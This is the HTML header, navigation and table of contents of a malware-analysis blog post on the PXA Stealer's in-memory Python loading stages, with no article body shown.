<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
  
    <meta http-equiv="content-language" content="en">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color">

  
  
    <title>PXA Stealers Evolution to PureRAT: Part 2 - In-Memory Python Loading (Stages 3 & 4) &middot; Ctrl&#43;Alt&#43;Dark</title>
    <meta name="title" content="PXA Stealers Evolution to PureRAT: Part 2 - In-Memory Python Loading (Stages 3 & 4) &middot; Ctrl&#43;Alt&#43;Dark">
  

  
  
    <meta name="description" content="Learn to disassemble Python bytecode and reconstruct custom hybrid encryption loaders as PXA Stealer uses multi-layered in-memory execution, registry persistence, and Telegram C2 to evade detection.">
  
  
    <meta name="keywords" content="malware-analysis,reverse-engineering,python,cryptography,">
  
  
  
  <link rel="canonical" href="//localhost:1313/posts/python_malware_part2/">
  

  
  
    <meta name="author" content="Darkrym">
  
  
    
      
        
          <link href="james.northey@proton.me" rel="me">
        
      
    
      
        
          <link href="https://github.com/Darkrym" rel="me">
        
      
    
      
        
          <link href="https://www.linkedin.com/in/j-northey/" rel="me">
        
      
    
      
        
          <link href="https://x.com/darkrym11" rel="me">
        
      
    
  

  
  <meta property="og:url" content="//localhost:1313/posts/python_malware_part2/">
  <meta property="og:site_name" content="Ctrl&#43;Alt&#43;Dark">
  <meta property="og:title" content="PXA Stealers Evolution to PureRAT: Part 2 - In-Memory Python Loading (Stages 3 & 4)">
  <meta property="og:description" content="Learn to disassemble Python bytecode and reconstruct custom hybrid encryption loaders as PXA Stealer uses multi-layered in-memory execution, registry persistence, and Telegram C2 to evade detection.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-08-30T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-08-30T00:00:00+00:00">
    <meta property="article:tag" content="Malware-Analysis">
    <meta property="article:tag" content="Reverse-Engineering">
    <meta property="article:tag" content="Python">
    <meta property="article:tag" content="Cryptography">
      <meta property="og:see_also" content="//localhost:1313/posts/python_malware_part6/">
      <meta property="og:see_also" content="//localhost:1313/posts/python_malware_part5/">
      <meta property="og:see_also" content="//localhost:1313/posts/python_malware_part4/">
      <meta property="og:see_also" content="//localhost:1313/posts/python_malware_part3/">
      <meta property="og:see_also" content="//localhost:1313/posts/python_malware_part1/">

  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="PXA Stealers Evolution to PureRAT: Part 2 - In-Memory Python Loading (Stages 3 & 4)">
  <meta name="twitter:description" content="Learn to disassemble Python bytecode and reconstruct custom hybrid encryption loaders as PXA Stealer uses multi-layered in-memory execution, registry persistence, and Telegram C2 to evade detection.">

  
  
  
  
    
      
    
  
    
      
    
  
    
      
    
  
  
    
  

  
  
  
  
  
  

  

  
  
  
  
  
  
  
    
  
  
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.37abffa7a556068d7e4f2a349f818a1594442041c5d3e0058046963e1fdf3c3a5575e1ad45cccdba1274f22ce9cedc51b166355def2eaa49194948a9f3f8ff23.css"
    integrity="sha512-N6v/p6VWBo1&#43;Tyo0n4GKFZREIEHF0&#43;AFgEaWPh/fPDpVdeGtRczNuhJ08izpztxRsWY1Xe8uqkkZSUip8/j/Iw==">

  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
  
  
  
  
  
  
    
    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
  

  
  
  
    
  
  
    
  
  
    
  
  
  
  
  
    
    <script
      defer
      type="text/javascript"
      id="script-bundle"
      src="/js/main.bundle.min.bdda7dece6cbaf08deef7d254f7f842f3261c2524d247905127c9a20decc03f1011a2950048464c79272c1ce0705a49a41147f39f2b95163bb71d404b33263ef.js"
      integrity="sha512-vdp97ObLrwje730lT3&#43;ELzJhwlJNJHkFEnyaIN7MA/EBGilQBIRkx5Jywc4HBaSaQRR/OfK5UWO7cdQEszJj7w=="
      data-copy="Copy"
      data-copied="Copied"></script>
  

  
  
























  

  

  

  

  









  
  
  <script type="module" src="/js/firebase.min.cad74e0625f72f359ec6d6fed579b87733749de70400e7614048050ed08832ee3f58983d5d139fb1ddc5f7f2f5047d45ed80ec923534a3660fc3a7965f936866.js" integrity="sha512-ytdOBiX3LzWextb&#43;1Xm4dzN0necEAOdhQEgFDtCIMu4/WJg9XROfsd3F9/L1BH1F7YDskjU0o2YPw6eWX5NoZg=="></script>

  
    
    
      
      
        
      
      
<script id="firebase-config" 
        type="application/json"
        data-views="views_posts/Python_Malware_Part2.md"
        data-likes="likes_posts/Python_Malware_Part2.md">
  {
    "config": {
      "apiKey": "AIzaSyBsBUDvJbxZCV3jF3Ndq_FPD9HNN40Gpc4",
      "authDomain": "darkrym-com.firebaseapp.com",
      "projectId": "darkrym-com",
      "storageBucket": "darkrym-com.firebasestorage.app",
      "messagingSenderId": "244697317148",
      "appId": "1:244697317148:web:d135a04be4ba930dfac4d9",
      "measurementId": "G-TM0Z5NG7EG"
    }
  }
</script>

    
  






  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
  

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Blog",
    "name": "PXA Stealers Evolution to PureRAT: Part 2 - In-Memory Python Loading (Stages 3 \u0026 4)",
    "headline": "PXA Stealers Evolution to PureRAT: Part 2 - In-Memory Python Loading (Stages 3 \u0026 4)",
    
    "inLanguage": "en",
    "url" : "//localhost:1313/posts/python_malware_part2/",
    "author" : {
      "@type": "Person",
      "name": "Darkrym"
    },
    "copyrightYear": "2025",
    "dateCreated": "2025-08-30T00:00:00\u002b00:00",
    "datePublished": "2025-08-30T00:00:00\u002b00:00",
    
    "dateModified": "2025-08-30T00:00:00\u002b00:00",
    
    "keywords": ["malware-analysis","reverse-engineering","python","cryptography"],
    
    "mainEntityOfPage": "true",
    "wordCount": "2020"
  }]
  </script>



  
  

  
  

  
  

  
  
</head>


















  
  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content">
        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
        Skip to main content
      </a>
    </div>
    
    
      <div class="min-h-[148px]"></div>
<div class="fixed inset-x-0 z-100">
  <div
    id="menu-blur"
    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl bg-neutral/25 dark:bg-neutral-800/25"></div>
  <div class="relative m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32">
    <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
  
    
    
      <div>
        <a href="/" class="flex">
          <span class="sr-only">Ctrl+Alt+Dark</span>
          
            <img
              src="/favicon.png"
              width="0"
              height="0"
              class="logo max-h-20 max-w-20 object-scale-down object-left nozoom"
              alt="">
          
        </a>
      </div>
    
  
  
    <a href="/" class="text-base font-medium truncate min-w-0 shrink site-title-link">
      <span class="site-title-prefix">&gt;#  </span><span class="site-title-text">cd ~/Ctrl&#43;Alt&#43;Dark</span>
    </a>
  
  <div class="flex items-center ms-auto">
    <div class="hidden md:flex">
      <nav class="flex items-center gap-x-5 h-12">
  
    
      
  
    <a
      href="/about/"
      
      class="flex items-center bf-icon-color-hover"
      aria-label="/about-me"
      title="Whoami">
      
      
        <span class="text-base font-medium break-normal">
          /about-me
        </span>
      
    </a>
  

    
      
  
    <a
      href="/cheat-sheets/"
      
      class="flex items-center bf-icon-color-hover"
      aria-label="/cheat-sheets"
      title="Cheat Sheets">
      
      
        <span class="text-base font-medium break-normal">
          /cheat-sheets
        </span>
      
    </a>
  

    
      
  
    <a
      href="/posts/"
      
      class="flex items-center bf-icon-color-hover"
      aria-label="/posts"
      title="Blog">
      
      
        <span class="text-base font-medium break-normal">
          /posts
        </span>
      
    </a>
  

    
      
  
    <a
      href="/topics/"
      
      class="flex items-center bf-icon-color-hover"
      aria-label="/topics"
      title="Projects">
      
      
        <span class="text-base font-medium break-normal">
          /topics
        </span>
      
    </a>
  

    
  

  

  

  
    <button
      id="search-button"
      aria-label="Search"
      class="text-base bf-icon-color-hover"
      title="Search (/)">
      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
    </button>
  

  
    <div class="flex items-center">
      <button
        id="appearance-switcher"
        aria-label="Dark mode switcher"
        type="button"
        class="text-base bf-icon-color-hover">
        <div class="flex items-center justify-center dark:hidden">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
        </div>
        <div class="items-center justify-center hidden dark:flex">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
        </div>
      </button>
    </div>
  
</nav>



    </div>
    <div class="flex md:hidden">
      <div class="flex items-center h-14 gap-4">
  
    <button
      id="search-button-mobile"
      aria-label="Search"
      class="flex items-center justify-center bf-icon-color-hover"
      title="Search (/)">
      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
    </button>
  

  
    <button
      id="appearance-switcher-mobile"
      type="button"
      aria-label="Dark mode switcher"
      class="flex items-center justify-center text-neutral-900 hover:text-primary-600 dark:text-neutral-200 dark:hover:text-primary-400">
      <div class="dark:hidden">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
      </div>
      <div class="hidden dark:block">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
      </div>
    </button>
  

  
    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
</span>
    </label>

    <div
      role="dialog"
      aria-modal="true"
      style="scrollbar-gutter: stable;"
      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
      bf-scrollbar">
      <label
        for="mobile-menu-toggle"
        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
      </label>
      <nav class="mx-auto max-w-md space-y-6">
        
  
    
    <div class="px-2">
      <a
        href="/about/"
        aria-label="/about-me"
        
        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
        
        <span title="Whoami" class="text-2xl font-bold tracking-tight">
          /about-me
        </span>
        
      </a>

      
    </div>
  
    
    <div class="px-2">
      <a
        href="/cheat-sheets/"
        aria-label="/cheat-sheets"
        
        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
        
        <span title="Cheat Sheets" class="text-2xl font-bold tracking-tight">
          /cheat-sheets
        </span>
        
      </a>

      
    </div>
  
    
    <div class="px-2">
      <a
        href="/posts/"
        aria-label="/posts"
        
        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
        
        <span title="Blog" class="text-2xl font-bold tracking-tight">
          /posts
        </span>
        
      </a>

      
    </div>
  
    
    <div class="px-2">
      <a
        href="/topics/"
        aria-label="/topics"
        
        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
        
        <span title="Projects" class="text-2xl font-bold tracking-tight">
          /topics
        </span>
        
      </a>

      
    </div>
  

        
  

        
  

      </nav>
    </div>
  
</div>







    </div>
  </div>
</div>




  <script>
    (function () {
      var mainmenu = document.querySelector(".main-menu");
      if (!mainmenu) return;

      var path = window.location.pathname;
      var links = mainmenu.querySelectorAll('a[href="' + path + '"]');

      links.forEach(function (link) {
        var targets = link.querySelectorAll("span");
        targets.forEach(function (el) {
          el.classList.add("active");
        });
      });
    })();
  </script>


  </div>
</div>


<script
  type="text/javascript"
  src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
  integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
  data-blur-id="menu-blur"></script>

    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  
  <article>
    
    
      
      
      
      
        







  
  
    
  
    
  
    
  
    
  



  
  




  





      
    

    
    <header id="single_header" class="mt-5 max-w-prose">
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="hidden">
    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/"
      >Ctrl&#43;Alt&#43;Dark</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline">
    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/"
      >Blog</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="hidden">
    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/python_malware_part2/"
      >PXA Stealers Evolution to PureRAT: Part 2 - In-Memory Python Loading (Stages 3 &amp; 4)</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        PXA Stealers Evolution to PureRAT: Part 2 - In-Memory Python Loading (Stages 3 & 4)
      </h1>
      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
  
    
  

  

  
    
  

  

  
    
  

  
    
  

  
    
  

  
    
  

  
    
  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2025-08-30T00:00:00&#43;00:00">30 August 2025</time><span class="px-2 text-primary-500">&middot;</span><span>2020 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">10 mins</span><span class="px-2 text-primary-500">&middot;</span><span>
  
  
    
    
      
      
        
        
      
      
    
  
  <span
    id="views_posts/Python_Malware_Part2.md"
    class="animate-pulse inline-block text-transparent max-h-3 rounded-full -mt-[2px] align-middle bg-neutral-300 dark:bg-neutral-400"
    title="views"
    >loading</span
  >
  <span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512">
<path fill="currentColor" d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></span>
</span>
<span class="px-2 text-primary-500">&middot;</span><span>
  
  
    
    
      
      
        
        
      
      
    
  
  <span
    id="likes_posts/Python_Malware_Part2.md"
    class="animate-pulse inline-block text-transparent max-h-3 rounded-full -mt-[2px] align-middle bg-neutral-300 dark:bg-neutral-400"
    title="likes"
    >loading</span
  >
  <span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
<path fill="currentColor" d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg></span></span>
</span>
<span class="px-2 text-primary-500">&middot;</span><span>
  <button
    id="button_likes"
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    <span id="button_likes_heart" class="inline-block align-text-bottom hidden"
      ><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
<path fill="currentColor" d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z"/></svg></span>
    </span>
    <span id="button_likes_emtpty_heart" class="inline-block align-text-bottom"
      ><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
<path fill="currentColor" d="M244 84L255.1 96L267.1 84.02C300.6 51.37 347 36.51 392.6 44.1C461.5 55.58 512 115.2 512 185.1V190.9C512 232.4 494.8 272.1 464.4 300.4L283.7 469.1C276.2 476.1 266.3 480 256 480C245.7 480 235.8 476.1 228.3 469.1L47.59 300.4C17.23 272.1 0 232.4 0 190.9V185.1C0 115.2 50.52 55.58 119.4 44.1C164.1 36.51 211.4 51.37 244 84C243.1 84 244 84.01 244 84L244 84zM255.1 163.9L210.1 117.1C188.4 96.28 157.6 86.4 127.3 91.44C81.55 99.07 48 138.7 48 185.1V190.9C48 219.1 59.71 246.1 80.34 265.3L256 429.3L431.7 265.3C452.3 246.1 464 219.1 464 190.9V185.1C464 138.7 430.4 99.07 384.7 91.44C354.4 86.4 323.6 96.28 301.9 117.1L255.1 163.9z"/></svg></span></span
    >
    <span id="button_likes_text">&nbsp;Like</span>
  </button>
</span>
    

    
    
  </div>

  

  
  

  
  



      </div>
      
    </header>

    
    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
      
      
      
      
      
        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
          <div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]">
            <details
  open
  id="TOCView"
  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a>
      <ul>
        <li><a href="#decoding-stage-three-base85-bytecode">Decoding Stage Three: Base85 Bytecode</a></li>
        <li><a href="#decrypting-stage-4">Decrypting Stage 4</a></li>
        <li><a href="#analysing-stage-4">Analysing Stage 4</a></li>
      </ul>
    </li>
    <li><a href="#up-next-stage-5--analysing-the-payload">Up Next: Stage 5 – Analysing the Payload</a></li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a>
      <ul>
        <li><a href="#decoding-stage-three-base85-bytecode">Decoding Stage Three: Base85 Bytecode</a></li>
        <li><a href="#decrypting-stage-4">Decrypting Stage 4</a></li>
        <li><a href="#analysing-stage-4">Analysing Stage 4</a></li>
      </ul>
    </li>
    <li><a href="#up-next-stage-5--analysing-the-payload">Up Next: Stage 5 – Analysing the Payload</a></li>
  </ul>
</nav>
  </div>
</details>


<script>
  (function () {
    'use strict'

    const SCROLL_OFFSET_RATIO = 0.33
    const TOC_SELECTOR = '#TableOfContents'
    const ANCHOR_SELECTOR = '.anchor'
    const TOC_LINK_SELECTOR = 'a[href^="#"]'
    const NESTED_LIST_SELECTOR = 'li ul'
    const ACTIVE_CLASS = 'active'
    let isJumpingToAnchor = false

    function getActiveAnchorId(anchors, offsetRatio) {
      const threshold = window.scrollY + window.innerHeight * offsetRatio
      const tocLinks = [...document.querySelectorAll('#TableOfContents a[href^="#"]')]
      const tocIds = new Set(tocLinks.map(link => link.getAttribute('href').substring(1)))

      if (isJumpingToAnchor) {
        for (let i = 0; i < anchors.length; i++) {
          const anchor = anchors[i]
          if (!tocIds.has(anchor.id)) continue
          const top = anchor.getBoundingClientRect().top + window.scrollY
          if (Math.abs(window.scrollY - top) < 100) {
            return anchor.id
          }
        }
      }

      for (let i = anchors.length - 1; i >= 0; i--) {
        const top = anchors[i].getBoundingClientRect().top + window.scrollY
        if (top <= threshold && tocIds.has(anchors[i].id)) {
          return anchors[i].id
        }
      }
      return anchors.find(anchor => tocIds.has(anchor.id))?.id || ''
    }

    function updateTOC({ toc, anchors, links, scrollOffset, collapseInactive }) {
      const activeId = getActiveAnchorId(anchors, scrollOffset)
      if (!activeId) return

      links.forEach(link => {
        const isActive = link.getAttribute('href') === `#${activeId}`
        link.classList.toggle(ACTIVE_CLASS, isActive)

        if (collapseInactive) {
          const ul = link.closest('li')?.querySelector('ul')
          if (ul) ul.style.display = isActive ? '' : 'none'
        }
      })

      if (collapseInactive) {
        const activeLink = toc.querySelector(`a[href="#${CSS.escape(activeId)}"]`)
        let el = activeLink
        while (el && el !== toc) {
          if (el.tagName === 'UL') el.style.display = ''
          if (el.tagName === 'LI') el.querySelector('ul')?.style.setProperty('display', '')
          el = el.parentElement
        }
      }
    }

    function initTOC() {
      const toc = document.querySelector(TOC_SELECTOR)
      if (!toc) return

      const collapseInactive = false
      const anchors = [...document.querySelectorAll(ANCHOR_SELECTOR)]
      const links = [...toc.querySelectorAll(TOC_LINK_SELECTOR)]

      if (collapseInactive) {
        toc.querySelectorAll(NESTED_LIST_SELECTOR).forEach(ul => ul.style.display = 'none')
      }

      links.forEach(link => {
        link.addEventListener('click', () => {
          isJumpingToAnchor = true
        })
      })

      const config = {
        toc,
        anchors,
        links,
        scrollOffset: SCROLL_OFFSET_RATIO,
        collapseInactive
      }

      window.addEventListener('scroll', () => updateTOC(config), { passive: true })
      window.addEventListener('hashchange', () => updateTOC(config), { passive: true })

      updateTOC(config)
    }

    document.readyState === 'loading'
      ? document.addEventListener('DOMContentLoaded', initTOC)
      : initTOC()
  })()
</script>


          </div>
        </div>
      


